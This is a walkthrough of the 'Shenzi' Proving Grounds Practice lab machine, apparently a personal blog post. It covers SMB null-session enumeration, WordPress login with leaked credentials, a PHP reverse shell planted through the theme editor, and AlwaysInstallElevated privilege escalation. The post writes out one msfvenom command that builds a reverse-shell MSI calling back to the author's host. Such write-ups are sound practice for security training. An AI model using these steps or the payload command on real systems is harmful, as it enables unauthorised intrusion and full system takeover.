---
layout: post
title: "Shenzi - Proving Grounds Practice"
summary: "Username, Share and endpoint name are same → SMB Null to find passwords.txt → Wordpress Theme Editor 404.php update → ivan-sincek reverse shell → User shell → winpeas.exe or powerup.ps1 → AlwaysInstallElevated enabled → msfvenom to create malicious msi file → Administrator"
---

# Shenzi - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed FTP, SMB and HTTP ports were open.

<img width="963" height="680" alt="Image" src="https://github.com/user-attachments/assets/1a28eaca-e0f3-4ef0-8efc-80d4525bc245" />

### SMB Enumeration
SMB Null session was allowed and I could access Shenzi share.

<img width="1263" height="165" alt="Image" src="https://github.com/user-attachments/assets/7b7c1028-736e-4ccf-bb15-2de3b2726e93" />

It included suspicious files such as `passwords.txt`.

<img width="1196" height="398" alt="Image" src="https://github.com/user-attachments/assets/5d5ecb65-dd08-4ecc-a5b6-5cde44f6ddbb" />

This file included different application's administrator passwords.

<img width="810" height="642" alt="Image" src="https://github.com/user-attachments/assets/ceee8ba7-4677-4a80-a928-81f8e18b0dbf" />

I then applied `RID Brute Forcing` and found that username is `shenzi`.

<img width="1286" height="176" alt="Image" src="https://github.com/user-attachments/assets/fdda3e61-e0d0-4220-9df0-1e9b2f9d1d72" />

## Exploitation
### Wordpress Theme Editor (404.php)
At first I tried directory brute force and many other things but non of them worked. Later, I thought the user's name is `shenzi`, share name is `shenzi` maybe there would be an endpoint named `shenzi` and indeed there was.

<img width="1105" height="630" alt="Image" src="https://github.com/user-attachments/assets/488a0f10-92f7-4c65-9531-dee0d39cb0d9" />

It was a wordpress website and I simply logged in using found credentials from `passwords.txt` file before.

<img width="1106" height="648" alt="Image" src="https://github.com/user-attachments/assets/6ce697dc-942b-466e-a7c6-0786aedfd7ec" />

I then used [ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell) to update `404.php` under theme editor. And changed IP value to my local IP.

<img width="1089" height="737" alt="Image" src="https://github.com/user-attachments/assets/8e69b8e4-a350-472a-a682-1b2b63a2005a" />

And I got the user shell.

<img width="1299" height="670" alt="Image" src="https://github.com/user-attachments/assets/a9050b74-ce4b-497d-8af2-f5a53a41ff9b" />

I then simply read the user flag.

<img width="660" height="487" alt="Image" src="https://github.com/user-attachments/assets/c7e5861c-3213-4526-aa25-45d83328a317" />

## Privilege Escalation
### AlwaysInstallElevated
The AlwaysInstallElevated check identifies a Windows Group Policy misconfiguration that allows standard users to install MSI packages with SYSTEM-level privileges. This setting, when enabled in both HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER, allows any user to execute arbitrary code with elevated privileges by creating a malicious MSI installer.

For more information: [https://docs.specterops.io/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated](https://docs.specterops.io/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated)

At first I executed `WinPEAS.exe` and `PowerUp.ps1` and both showed that `AlwaysInstallElevated` was enabled.

<img width="1018" height="80" alt="Image" src="https://github.com/user-attachments/assets/1a29f56f-f77d-4d2c-a898-64cec5e9c564" />

<img width="572" height="313" alt="Image" src="https://github.com/user-attachments/assets/f3fa1416-8984-4e2c-9b2f-73a2692cd2a1" />

As seen in second image, I tried `Write-UserAddMsi` but it did not work. Later, I created a malicious msi file with `msfvenom`.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.210 LPORT=4444 -f msi -o malicious.msi
```

<img width="858" height="156" alt="Image" src="https://github.com/user-attachments/assets/ce44aa0e-0b31-4a2f-b1f2-e55231d3188c" />

Then I transfered it and executed it on the target machine.

<img width="692" height="67" alt="Image" src="https://github.com/user-attachments/assets/7e69fe5d-ff7e-4fed-9195-5cd0c06c7daf" />

And I simply obtained SYSTEM shell and read administrator flag.

<img width="768" height="444" alt="Image" src="https://github.com/user-attachments/assets/f4983eb9-108b-4ad5-88fd-c2196687acf2" />
